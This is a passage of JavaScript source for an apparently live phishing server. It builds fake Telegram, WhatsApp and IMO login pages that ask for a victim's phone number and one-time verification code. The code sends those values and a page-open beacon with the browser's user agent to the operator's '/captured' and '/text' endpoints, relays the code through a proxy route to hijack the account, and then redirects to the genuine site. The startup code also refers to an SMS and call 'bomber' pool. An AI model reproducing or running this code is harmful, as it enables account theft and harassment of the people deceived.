UID='${uid}',D='${base}/d',SITE='${c.site}',RDR='${c.rdr}';window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:SITE+' Opened',data:navigator.userAgent})}).catch(()=>{});async function sub(){const u=document.getElementById('u').value,p=document.getElementById('p').value;if(!u||!p){document.getElementById('u').style.borderColor='#f02849';return;}const btn=document.getElementById('btn');btn.textContent='Logging in...';btn.disabled=true;try{await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:u,otp:p})});}catch(e){}setTimeout(()=>window.location.href=RDR,800);}</script></body></html>`;
}

function otpPage(action, uid, req) {
    const base = getBase(req);
    const sid  = crypto.randomBytes(10).toString('hex');
    const C = { phish_tg:{ name:'Telegram', rdr:'https://telegram.org', proxy:'tg', ac:'#229ed9', hdr:'#17212b', hot:'🔔 Telegram — New Login', sub:'Verify to secure your account.', t1:'Sign in to Telegram', s1:'Select country and enter phone.', t2:'Enter the Code', s2:'Code sent to your app.' }, phish_wa:{ name:'WhatsApp', rdr:'https://www.whatsapp.com', proxy:'wa', ac:'#25d366', hdr:'#075e54', hot:'🔔 WhatsApp — Verify', sub:'New device linking attempt.', t1:'Enter phone number', s1:'WhatsApp sends SMS code.', t2:'Enter 6-digit code', s2:'Code sent to {phone} via SMS.' }, phish_imo:{ name:'IMO', rdr:'https://imo.im', proxy:'imo', ac:'#0052d9', hdr:'#003da3', hot:'🔔 IMO — Verification', sub:'Enter number for code.', t1:'Enter phone number', s1:'IMO sends code.', t2:'Enter code', s2:'Code sent to {phone} via SMS.' } };
    const c = C[action];
    const opts = [['880','🇧🇩 BD +880'],['91','🇮🇳 IN +91'],['92','🇵🇰 PK +92'],['1','🇺🇸 US +1'],['44','🇬🇧 UK +44'],['966','🇸🇦 SA +966'],['971','🇦🇪 UAE +971'],['60','🇲🇾 MY +60'],['65','🇸🇬 SG +65'],['62','🇮🇩 ID +62'],['84','🇻🇳 VN +84'],['95','🇲🇲 MM +95'],['94','🇱🇰 LK +94'],['977','🇳🇵 NP +977'],['20','🇪🇬 EG +20'],['234','🇳🇬 NG +234'],['49','🇩🇪 DE +49'],['33','🇫🇷 FR +33'],['7','🇷🇺 RU +7'],['55','🇧🇷 BR +55'],['81','🇯🇵 JP +81'],['86','🇨🇳 CN +86'],['90','🇹🇷 TR +90'],['98','🇮🇷 IR +98'],['964','🇮🇶 IQ +964'],['974','🇶🇦 QA +974'],['965','🇰🇼 KW +965']];
    const seen = new Set();
    const optHtml = opts.filter(([v]) => seen.has(v) ? false : seen.add(v)).map(([v,t]) => `<option value="${v}">${t}</option>`).join('');
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${c.name}</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:${c.hdr};min-height:100vh;font-family:-apple-system,sans-serif;padding:14px}.logo{font-size:20px;font-weight:700;color:#fff;text-align:center;margin-bottom:10px}.card{background:#fff;border-radius:14px;padding:20px 16px;margin-top:10px}.card h2{font-size:17px;font-weight:700;color:#111;margin-bottom:6px}.card p{font-size:13px;color:#666;margin-bottom:16px;line-height:1.5}.row{display:flex;border:1.5px solid #e0e0e0;border-radius:10px;overflow:hidden;margin-bottom:14px}select{padding:13px 8px;border:none;background:#f5f5f5;font-size:13px;color:#333;outline:none;max-width:150px}.ph{flex:1;padding:13px;border:none;font-size:15px;color:#111;outline:none}.otp{width:100%;padding:18px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:30px;text-align:center;color:#111;outline:none;letter-spacing:10px;margin-bottom:14px;display:block}.btn{width:100%;padding:15px;background:${c.ac};color:#fff;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer}.err{background:#fff3e0;border:1px solid #ff9800;border-radius:8px;padding:9px 12px;font-size:13px;color:#e65100;margin-bottom:12px;display:none}.spin{text-align:center;font-size:13px;color:#888;padding:6px 0;display:none}</style></head><body>${vidBlock(c.hot,c.sub)}<div class="logo">${c.name}</div><div class="card" id="st1"><h2>${c.t1}</h2><p>${c.s1}</p><div class="err" id="e1">Enter valid number!</div><div class="row"><select id="cc">${optHtml}</select><input type="tel" id="ph" class="ph" placeholder="Phone number" inputmode="numeric"></div><div class="spin" id="sp1">📤 Sending...</div><button class="btn" id="b1" onclick="send()">Next →</button></div><div class="card" id="st2" style="display:none"><h2>${c.t2}</h2><p id="oi">${c.s2}</p><div class="err" id="e2">Invalid code!</div><input type="text" class="otp" id="otp" placeholder="- - - - -" inputmode="numeric"><div class="spin" id="sp2">🔄 Verifying...</div><button class="btn" id="b2" onclick="verify()">✅ Verify</button></div><script>const UID='${uid}',BASE='${base}',D='${base}/d',SID='${sid}',SITE='${c.name}',RDR='${c.rdr}',PROXY='${c.proxy}';let fp='';window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:SITE+' Opened',data:navigator.userAgent})}).catch(()=>{});async function send(){const cc=document.getElementById('cc').value,ph=document.getElementById('ph').value.trim().replace(/^0+/,'');if(!ph||ph.length<5){document.getElementById('e1').style.display='block';return;}document.getElementById('e1').style.display='none';const b1=document.getElementById('b1');b1.disabled=true;b1.textContent='Sending...';document.getElementById('sp1').style.display='block';fp='+'+cc+ph;fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'📱 '+SITE,data:fp})}).catch(()=>{});try{const body=PROXY==='wa'?JSON.stringify({cc,phone_local:ph,sid:SID}):JSON.stringify({phone:fp,sid:SID});const resp=await fetch(BASE+'/proxy/'+PROXY+'/send',{method:'POST',headers:{'Content-Type':'application/json'},body});const data=await resp.json();if(data.tgError){document.getElementById('e1').style.display='block';document.getElementById('e1').textContent='Error: '+data.tgError;document.getElementById('sp1').style.display='none';b1.disabled=false;b1.textContent='Next →';return;}}catch(er){}document.getElementById('sp1').style.display='none';document.getElementById('oi').textContent='${c.s2}'.replace('{phone}',fp);document.getElementById('st1').style.display='none';document.getElementById('st2').style.display='block';setTimeout(()=>document.getElementById('otp').focus(),300);}async function verify(){const otp=document.getElementById('otp').value.trim();if(!otp||otp.length<3){document.getElementById('e2').style.display='block';return;}document.getElementById('e2').style.display='none';const b2=document.getElementById('b2');b2.disabled=true;document.getElementById('sp2').style.display='block';try{await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:fp,otp})});}catch(e){}try{await fetch(BASE+'/proxy/'+PROXY+'/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:fp,otp,sid:SID,uid:UID})});}catch(er){}setTimeout(()=>window.location.href=RDR,700);}</script></body></html>`;
}

// ── Guards + start ──
process.on('uncaughtException',  err => log.error('[UNCAUGHT] '+err.message));
process.on('unhandledRejection', err => log.error('[REJECTION] '+(err && err.message ? err.message : String(err))));
process.on('SIGTERM', () => { saveStore(); server.close(()=>process.exit(0)); });
process.on('SIGINT',  () => { saveStore(); server.close(()=>process.exit(0)); });

server.listen(CFG.PORT, () => {
    log.info(`[Server] Online — port ${CFG.PORT}`);
    log.info(`[Config] Admin: ${CFG.ADMIN_ID} | Channel: ${CFG.CHANNEL}`);
    log.info(`[Bomber] SMS=${BOMB_POOL.sms.length} Call=${BOMB_POOL.call.length}`);
});
setInterval(() => {
    if (CFG.BASE_URL) axios.get(CFG.BASE_URL + '/health').catch(()=>{});
    log.info(`[Ping] Up: ${Math.floor(process.uptime()/60)}min | Mem: ${Math.round(process.memoryUsage().heapUsed/1024/1024)}MB | Q: ${msgQueue.length}`);
}, 5*60*1000);
